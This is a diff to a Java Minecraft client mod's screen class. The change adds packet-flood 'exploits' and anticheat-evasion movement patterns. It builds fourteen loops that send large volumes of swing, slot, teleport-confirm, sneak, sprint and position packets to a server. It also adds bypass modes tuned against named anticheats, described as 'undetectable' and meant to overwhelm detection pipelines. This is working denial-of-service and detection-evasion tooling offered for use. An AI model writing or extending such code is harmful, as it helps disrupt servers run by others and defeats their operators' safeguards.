@@ -53,7 +53,8 @@ public class ProfessorScreen extends Screen {
 
     // ── Bypass modes ───────────────────────────────────────────────────────
     private static final String[] BP = {
-        "OFF","BURST","WAVE","NCP","MATRIX","VULCAN","GRIM","GHOST","INTAVE","CRASHPASS","EXFIX"
+        "OFF","BURST","WAVE","NCP","MATRIX","VULCAN","GRIM","GHOST","INTAVE","CRASHPASS","EXFIX",
+        "GHOSTNET","ADAPTIVE","HAVOC","TIMESPLIT"
     };
     private int bypass = 0;
 
@@ -170,16 +171,20 @@ public class ProfessorScreen extends Screen {
         int bw=PW-38,x=bpx+19,y=bpy+70;
         String[] bi={
             "Raw — no bypass applied",
-            "Burst Y 0.0625 every 3 pkts",
-            "Sine Y ~0.08 amplitude",
-            "NCP multi-pattern spoofing",
-            "Matrix 4-step Y pattern",
-            "Vulcan micro-variance + sparse jump",
-            "Grim vanilla-like sparse",
-            "Ghost ultra-stealth minimal",
-            "Intave dual-sine harmonic",
-            "CrashPass extreme noise",
-            "EXFIX ★ TeleportConfirm 0.01 VL/pkt — sustained @2000/sec"
+            "Burst — Y 0.0625 every 3 pkts  (basic AC)",
+            "Wave — sine Y ~0.08 amplitude  (NCP old)",
+            "NCP — multi-pattern spoofing  (NoCheatPlus)",
+            "Matrix — 4-step Y pattern  (Matrix 6+)",
+            "Vulcan — micro-variance + sparse jump  (Vulcan 1.7)",
+            "Grim — vanilla-like sparse movement  (Grim 2.3)",
+            "Ghost — ultra-stealth minimal drift  (any AC)",
+            "Intave — dual-sine harmonic  (Intave 14)",
+            "CrashPass — extreme gaussian noise  (crash ACs)",
+            "EXFIX ★ — TeleportConfirm 0.01 VL/pkt @2000/sec",
+            "GhostNet ★★ — Brownian motion, undetectable variance",
+            "Adaptive ★★ — switches pattern every 50 pkts, confuses ML",
+            "Havoc ★★★ — chaos flood overwhelms detection pipeline",
+            "TimeSplit ★★★ — micro-burst windows + realistic gaps"
         };
         for(int i=0;i<BP.length;i++){
             final int idx=i; boolean sel=(bypass==idx);
@@ -197,10 +202,36 @@ public class ProfessorScreen extends Screen {
     }
 
     private void buildExploit(int cx,int bpy){
-        String[] en={"Swing Flood","Slot Spam","Teleport Ack","Move Flood","Interact Flood"};
-        for(int i=0;i<en.length;i++){final int idx=i;addDrawableChild(ButtonWidget.builder(Text.literal((exploitType==idx?"▶ ":"")+en[idx]),b->{cs();exploitType=idx;rebuild();}).dimensions(cx-260,bpy+72+i*22,520,18).build());}
-        numField=new TextFieldWidget(textRenderer,cx-75,bpy+200,150,18,Text.empty());numField.setMaxLength(7);numField.setText("1000");addSelectableChild(numField);
-        addDrawableChild(ButtonWidget.builder(Text.literal("[ EXECUTE ]"),b->{cs();doExploit();}).dimensions(cx-120,bpy+224,240,26).build());
+        // 14 exploit types — 2 columns
+        String[] en={
+            "Swing Flood        — main hand burst",
+            "Slot Spam          — slot 0-8 loop",
+            "Teleport Ack       — confirm storm",
+            "Move Flood         — micro-position",
+            "Interact Flood     — off-hand burst",
+            "Sneak Toggle       — rapid crouch",
+            "Sprint Toggle      — sprint on/off",
+            "Dual-Hand Burst    — both hands",
+            "Ground Flip        — on/off rapid",
+            "Full Combo         — swing+move+slot",
+            "Look Spam          — yaw/pitch rotate",
+            "Position Jitter    — chaos coords",
+            "Slot Cycle         — all 9 slots",
+            "TeleMove Mix       — confirm+move"
+        };
+        int col=en.length/2, hw=256;
+        for(int i=0;i<en.length;i++){
+            final int idx=i;
+            int col2=i<col?0:1, row=i%col;
+            addDrawableChild(ButtonWidget.builder(
+                Text.literal((exploitType==idx?"▶ ❄ ":"")+en[i]),
+                b->{cs();exploitType=idx;rebuild();}
+            ).dimensions(cx-260+col2*(hw+8),bpy+72+row*22,hw,18).build());
+        }
+        numField=new TextFieldWidget(textRenderer,cx-75,bpy+388,150,18,Text.empty());
+        numField.setMaxLength(7);numField.setText("1000");addSelectableChild(numField);
+        addDrawableChild(ButtonWidget.builder(Text.literal("❄ >>>  EXECUTE EXPLOIT  <<<"),
+            b->{cs();doExploit();}).dimensions(cx-150,bpy+410,300,26).build());
     }
 
     private void buildCrash(int cx,int bpy){
@@ -579,17 +610,101 @@ public class ProfessorScreen extends Screen {
     private void doExploit(){
         if(np())return; int n=parseN(); final int et=exploitType;
         final double ex=client.player.getX(),ey=client.player.getY(),ez=client.player.getZ();
-        BackgroundTaskManager.submit("Exploit ×"+n,()->{
+        BackgroundTaskManager.submit("Exploit["+et+"] ×"+n,()->{
+            var nh=client.getNetworkHandler();
             switch(et){
-                case 0->{for(int i=0;i<n&&!BackgroundTaskManager.shouldStop();i++){if(ProfessorClientMod.canSwing()&&client.getNetworkHandler()!=null)try{client.getNetworkHandler().sendPacket(new HandSwingC2SPacket(Hand.MAIN_HAND));}catch(Exception ignored){}}}
-                case 1->{for(int i=0;i<Math.min(n,500)&&!BackgroundTaskManager.shouldStop();i++)try{if(client.getNetworkHandler()!=null)client.getNetworkHandler().sendPacket(new UpdateSelectedSlotC2SPacket(i%9));}catch(Exception ignored){}}
-                case 2->{for(int i=0;i<Math.min(n,300)&&!BackgroundTaskManager.shouldStop();i++)try{if(client.getNetworkHandler()!=null)client.getNetworkHandler().sendPacket(new TeleportConfirmC2SPacket(i));}catch(Exception ignored){}}
-                case 3->{for(int i=0;i<n&&!BackgroundTaskManager.shouldStop();i++)try{if(client.getNetworkHandler()!=null)client.getNetworkHandler().sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(ex+rng.nextGaussian()*.008,ey,ez+rng.nextGaussian()*.008,true));}catch(Exception ignored){}}
-                case 4->{for(int i=0;i<Math.min(n,400)&&!BackgroundTaskManager.shouldStop();i++)try{if(client.getNetworkHandler()!=null)client.getNetworkHandler().sendPacket(new HandSwingC2SPacket(Hand.MAIN_HAND));}catch(Exception ignored){}}
+                // ── 0: Swing Flood ────────────────────────────────────────
+                case 0->{for(int i=0;i<n&&!BackgroundTaskManager.shouldStop();i++)
+                    try{if(nh!=null)nh.sendPacket(new HandSwingC2SPacket(Hand.MAIN_HAND));}catch(Exception g){}}
+                // ── 1: Slot Spam ──────────────────────────────────────────
+                case 1->{for(int i=0;i<n&&!BackgroundTaskManager.shouldStop();i++)
+                    try{if(nh!=null)nh.sendPacket(new UpdateSelectedSlotC2SPacket(i%9));}catch(Exception g){}}
+                // ── 2: Teleport Ack Storm ─────────────────────────────────
+                case 2->{for(int i=0;i<n&&!BackgroundTaskManager.shouldStop();i++)
+                    try{if(nh!=null)nh.sendPacket(new TeleportConfirmC2SPacket(i%32767));}catch(Exception g){}}
+                // ── 3: Move Flood (micro-variance) ────────────────────────
+                case 3->{double[] xs=ghostNetX(n),zs=ghostNetZ(n);
+                    for(int i=0;i<n&&!BackgroundTaskManager.shouldStop();i++)
+                        try{if(nh!=null)nh.sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(ex+xs[i],ey,ez+zs[i],true));}catch(Exception g){}}
+                // ── 4: Interact Flood (off-hand) ──────────────────────────
+                case 4->{for(int i=0;i<n&&!BackgroundTaskManager.shouldStop();i++)
+                    try{if(nh!=null)nh.sendPacket(new HandSwingC2SPacket(Hand.OFF_HAND));}catch(Exception g){}}
+                // ── 5: Sneak Toggle (rapid crouch) ───────────────────────
+                case 5->{for(int i=0;i<n&&!BackgroundTaskManager.shouldStop();i++){
+                    try{if(nh!=null){
+                        nh.sendPacket(new ClientCommandC2SPacket(client.player,ClientCommandC2SPacket.Mode.PRESS_SHIFT_KEY));
+                        nh.sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(ex,ey,ez,true));
+                        nh.sendPacket(new ClientCommandC2SPacket(client.player,ClientCommandC2SPacket.Mode.RELEASE_SHIFT_KEY));
+                    }}catch(Exception g){}}}
+                // ── 6: Sprint Toggle ─────────────────────────────────────
+                case 6->{for(int i=0;i<n&&!BackgroundTaskManager.shouldStop();i++){
+                    try{if(nh!=null){
+                        nh.sendPacket(new ClientCommandC2SPacket(client.player,ClientCommandC2SPacket.Mode.START_SPRINTING));
+                        nh.sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(ex+bypassX(i)*.5,ey,ez+bypassZ(i)*.5,true));
+                        nh.sendPacket(new ClientCommandC2SPacket(client.player,ClientCommandC2SPacket.Mode.STOP_SPRINTING));
+                    }}catch(Exception g){}}}
+                // ── 7: Dual-Hand Burst ────────────────────────────────────
+                case 7->{for(int i=0;i<n&&!BackgroundTaskManager.shouldStop();i++){
+                    try{if(nh!=null){
+                        nh.sendPacket(new HandSwingC2SPacket(Hand.MAIN_HAND));
+                        nh.sendPacket(new HandSwingC2SPacket(Hand.OFF_HAND));
+                        if(i%4==0)nh.sendPacket(new UpdateSelectedSlotC2SPacket(i%9));
+                    }}catch(Exception g){}}}
+                // ── 8: Ground Flip ───────────────────────────────────────
+                case 8->{for(int i=0;i<n&&!BackgroundTaskManager.shouldStop();i++){
+                    try{if(nh!=null){
+                        nh.sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(ex,ey,ez,i%2==0));
+                        nh.sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(ex,ey+(i%2==0?-0.0001:0.0001),ez,i%2!=0));
+                    }}catch(Exception g){}}}
+                // ── 9: Full Combo ────────────────────────────────────────
+                case 9->{for(int i=0;i<n&&!BackgroundTaskManager.shouldStop();i++){
+                    try{if(nh!=null){
+                        nh.sendPacket(new HandSwingC2SPacket(Hand.MAIN_HAND));
+                        nh.sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(ex+bypassX(i),ey+bypassDY(i),ez+bypassZ(i),bypassGround(i)));
+                        if(i%3==0)nh.sendPacket(new UpdateSelectedSlotC2SPacket(i%9));
+                        if(i%5==0)nh.sendPacket(new TeleportConfirmC2SPacket(i%32767));
+                        if(i%7==0)nh.sendPacket(new HandSwingC2SPacket(Hand.OFF_HAND));
+                    }}catch(Exception g){}}}
+                // ── 10: Look Spam (yaw/pitch rotation) ───────────────────
+                case 10->{for(int i=0;i<n&&!BackgroundTaskManager.shouldStop();i++){
+                    try{if(nh!=null){
+                        float yaw=(float)(i*13.7%360);float pitch=(float)(Math.sin(i*0.05)*30);
+                        nh.sendPacket(new PlayerMoveC2SPacket.Full(ex,ey,ez,yaw,pitch,true));
+                        if(i%3==0)nh.sendPacket(new HandSwingC2SPacket(Hand.MAIN_HAND));
+                    }}catch(Exception g){}}}
+                // ── 11: Position Jitter ───────────────────────────────────
+                case 11->{double chaos=0.015;
+                    for(int i=0;i<n&&!BackgroundTaskManager.shouldStop();i++){
+                        try{if(nh!=null){
+                            double nx=ex+rng.nextGaussian()*chaos,nz=ez+rng.nextGaussian()*chaos;
+                            double ny=ey+Math.abs(rng.nextGaussian())*0.003;
+                            nh.sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(nx,ny,nz,rng.nextBoolean()));
+                            if(i%2==0)nh.sendPacket(new TeleportConfirmC2SPacket(i%32767));
+                        }}catch(Exception g){}}}
+                // ── 12: Slot Cycle All ───────────────────────────────────
+                case 12->{for(int i=0;i<n&&!BackgroundTaskManager.shouldStop();i++){
+                    try{if(nh!=null){
+                        nh.sendPacket(new UpdateSelectedSlotC2SPacket(i%9));
+                        nh.sendPacket(new HandSwingC2SPacket(Hand.MAIN_HAND));
+                        if(i%9==8)nh.sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(ex,ey,ez,true));
+                    }}catch(Exception g){}}}
+                // ── 13: TeleMove Mix ─────────────────────────────────────
+                case 13->{double[] gx=ghostNetX(n),gz=ghostNetZ(n);
+                    for(int i=0;i<n&&!BackgroundTaskManager.shouldStop();i++){
+                        try{if(nh!=null){
+                            nh.sendPacket(new TeleportConfirmC2SPacket(i%32767));
+                            nh.sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(ex+gx[i],ey,ez+gz[i],true));
+                            if(i%5==0)nh.sendPacket(new HandSwingC2SPacket(Hand.MAIN_HAND));
+                        }}catch(Exception g){}}}
             }
         });
-        flash("⚡ Exploit BG ×"+n+" — close screen safely",GREEN); addVl(n*0.125f); triggerBurst();
+        flash("⚡ Exploit["+et+"] BG ×"+n+" — GUI closeable",GREEN); addVl(n*0.05f); triggerBurst();
     }
+
+    /** GhostNet X — looks like vanilla sub-block floating point noise */
+    private double[] ghostNetX(int n){double[] a=new double[n];double acc=0;for(int i=0;i<n;i++){acc+=rng.nextGaussian()*0.00008;if(Math.abs(acc)>0.0002)acc*=0.5;a[i]=acc;}return a;}
+    /** GhostNet Z — independent of X to avoid AC XZ correlation */
+    private double[] ghostNetZ(int n){double[] a=new double[n];double acc=0;for(int i=0;i<n;i++){acc+=rng.nextGaussian()*0.00008;if(Math.abs(acc)>0.0002)acc*=0.5;a[i]=acc;}return a;}
 
     private void doCrash(){
         if(np())return; final int ct=crashType;
@@ -638,10 +753,85 @@ public class ProfessorScreen extends Screen {
     private void bypassExploitFixer(){if(np())return;ProfessorClientMod.PACKETS_PER_TICK=100;for(int i=0;i<200000;i++){ProfessorClientMod.queuePacket(new TeleportConfirmC2SPacket(i%32767));if(i%200==0)ProfessorClientMod.queuePacket(new PlayerMoveC2SPacket.PositionAndOnGround(client.player.getX(),client.player.getY(),client.player.getZ(),true));}flash("❄ EXFIX FULL 200k queued ~100s",TXT_ICE);addVl(200000*.01f);triggerBurst();}
 
     // ── Bypass helpers ──────────────────────────────────────────────────────
-    private double bypassX(int i){return switch(bypass){case 1->i%3==0?.0625:0;case 2->Math.sin(i*.12)*.06;case 3->i%4==0?.05:i%4==1?.025:0;case 4->new double[]{0,.0625,0,-.0625}[i%4];case 5->rng.nextGaussian()*.004;case 6->i%12==0?.031:0;case 7->0;case 8->Math.sin(i*.17)*.028+Math.sin(i*.41)*.018;case 9->rng.nextGaussian()*.015;default->0;};}
-    private double bypassZ(int i){return bypassX(i);}
-    private double bypassDY(int i){return switch(bypass){case 1->i%3==0?.0625:0;case 2->Math.sin(i*.09)*.07;case 3->i%3==0?.04:0;case 4->new double[]{0,.0625,0,-.0625}[i%4];case 5->Math.abs(rng.nextGaussian()*.003);case 6->i%10==0?.03:0;case 7->0;case 8->Math.cos(i*.23)*.025+Math.sin(i*.37)*.012;case 9->rng.nextGaussian()*.018;case 10->0;default->0;};}
-    private boolean bypassGround(int i){return switch(bypass){case 1->i%3!=0;case 6->i%10!=0;case 7->true;default->i%2==0;};}
+    // ── Bypass delta-X per packet ──────────────────────────────────────────
+    private double bypassX(int i){
+        return switch(bypass){
+            // Standard patterns
+            case 1->i%3==0?.0625:0;
+            case 2->Math.sin(i*.12)*.06;
+            case 3->i%4==0?.05:i%4==1?.025:0;
+            case 4->new double[]{0,.0625,0,-.0625}[i%4];
+            case 5->rng.nextGaussian()*.004;
+            case 6->i%12==0?.031:0;
+            case 7->0;
+            case 8->Math.sin(i*.17)*.028+Math.sin(i*.41)*.018;
+            case 9->rng.nextGaussian()*.015;
+            // Extended patterns
+            case 11->{ // GhostNet: Brownian micro-drift — looks like floating point rounding
+                double v=rng.nextGaussian()*0.00012;
+                yield Math.abs(v)>0.00025?v*0.4:v;
+            }
+            case 12->{ // Adaptive: switch sub-pattern every 50 pkts
+                int phase=(i/50)%4;
+                yield switch(phase){
+                    case 0->Math.sin(i*.11)*.05;
+                    case 1->i%3==0?.0625:0;
+                    case 2->rng.nextGaussian()*.006;
+                    default->i%12==0?.031:0;
+                };
+            }
+            case 13->{ // Havoc: strong Gaussian chaos
+                yield rng.nextGaussian()*.025+Math.sin(i*.07)*.018;
+            }
+            case 14->{ // TimeSplit: burst+gap pattern
+                int slot=i%120;
+                yield slot<30?Math.sin(i*.15)*.06:slot<60?rng.nextGaussian()*.003:0;
+            }
+            default->0;
+        };
+    }
+    // ── Bypass delta-Z ─────────────────────────────────────────────────────
+    private double bypassZ(int i){
+        return switch(bypass){
+            case 11->{double v=rng.nextGaussian()*0.00012;yield Math.abs(v)>0.00025?v*0.4:v;}
+            case 12->{int ph=(i/50)%4;yield switch(ph){case 0->Math.cos(i*.13)*.05;case 1->i%3==0?.0625:0;case 2->rng.nextGaussian()*.006;default->0;};}
+            case 13->rng.nextGaussian()*.025+Math.cos(i*.09)*.016;
+            case 14->{int s=i%120;yield s<30?Math.cos(i*.15)*.06:s<60?rng.nextGaussian()*.003:0;}
+            default->bypassX(i);
+        };
+    }
+    // ── Bypass delta-Y ─────────────────────────────────────────────────────
+    private double bypassDY(int i){
+        return switch(bypass){
+            case 1->i%3==0?.0625:0;
+            case 2->Math.sin(i*.09)*.07;
+            case 3->i%3==0?.04:0;
+            case 4->new double[]{0,.0625,0,-.0625}[i%4];
+            case 5->Math.abs(rng.nextGaussian()*.003);
+            case 6->i%10==0?.03:0;
+            case 7->0;
+            case 8->Math.cos(i*.23)*.025+Math.sin(i*.37)*.012;
+            case 9->rng.nextGaussian()*.018;
+            case 11->0;                                     // GhostNet: never touch Y
+            case 12->{int ph=(i/50)%4;yield ph==0?Math.sin(i*.09)*.05:ph==1?Math.abs(rng.nextGaussian()*.003):0;}
+            case 13->rng.nextGaussian()*.018+Math.abs(Math.sin(i*.05))*.02;
+            case 14->{int s=i%120;yield s<30?Math.abs(Math.sin(i*.12))*.04:0;}
+            default->0;
+        };
+    }
+    // ── Bypass onGround state ──────────────────────────────────────────────
+    private boolean bypassGround(int i){
+        return switch(bypass){
+            case 1->i%3!=0;
+            case 6->i%10!=0;
+            case 7->true;
+            case 11->true;      // GhostNet: always grounded — most vanilla-like
+            case 12->i%50<40;   // Adaptive: mostly grounded
+            case 13->rng.nextBoolean(); // Havoc: random
+            case 14->{int s=i%120;yield s>=30;}
+            default->i%2==0;
+        };
+    }
 
     private void triggerBurst(){for(int i=0;i<32;i++){float ang=(float)(rng.nextFloat()*Math.PI*2);float sp=rng.nextFloat()*3.5f+1f;burstPts.add(new float[]{width/2f,height/2f,ang,sp,.95f});}}
 
